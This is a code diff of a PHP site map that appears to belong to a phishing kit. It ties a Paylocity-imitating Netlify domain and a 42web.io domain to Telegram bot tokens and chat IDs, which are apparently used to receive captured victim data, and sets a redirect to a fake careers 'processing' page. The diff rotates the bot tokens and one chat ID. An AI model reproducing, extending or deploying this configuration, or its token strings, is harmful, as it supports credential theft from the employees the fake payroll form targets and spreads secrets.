@@ -14,9 +14,9 @@ $site_map = [
     
     'paysphere.42web.io' => [
         'bots' => [
-            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
+            ['token' => '8567913790:AAEP8WeOiMLclA_fZGV_zb8EbaQe2Q2Gv7c', 'chat_id' => '1325797388'],
 
-            ['token' => '8327467242:AAFFBheM0nU1-45BKH5vAvdfXKhgXPopJvg', 'chat_id' => '7919111838']
+            ['token' => '8310302855:AAFBNgxxlAnaTtpWmJ7pVSP9kkW0j0TiwUY', 'chat_id' => '8160582785']
         ],
         'redirect' => 'https://paysphere.42web.io/cache_site/careers/all-listings.job.34092/processing.html'
     ],
@@ -24,9 +24,9 @@ $site_map = [
 
     'paylocityemployeeform.netlify.app' => [
         'bots' => [
-            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
+            ['token' => '8567913790:AAEP8WeOiMLclA_fZGV_zb8EbaQe2Q2Gv7c', 'chat_id' => '1325797388'],
 
-            ['token' => '8327467242:AAFFBheM0nU1-45BKH5vAvdfXKhgXPopJvg', 'chat_id' => '7919111838']
+            ['token' => '8310302855:AAFBNgxxlAnaTtpWmJ7pVSP9kkW0j0TiwUY', 'chat_id' => '8160582785']
         ],
         'redirect' => 'https://paysphere.42web.io/cache_site/careers/all-listings.job.34092/processing.html'
     ],
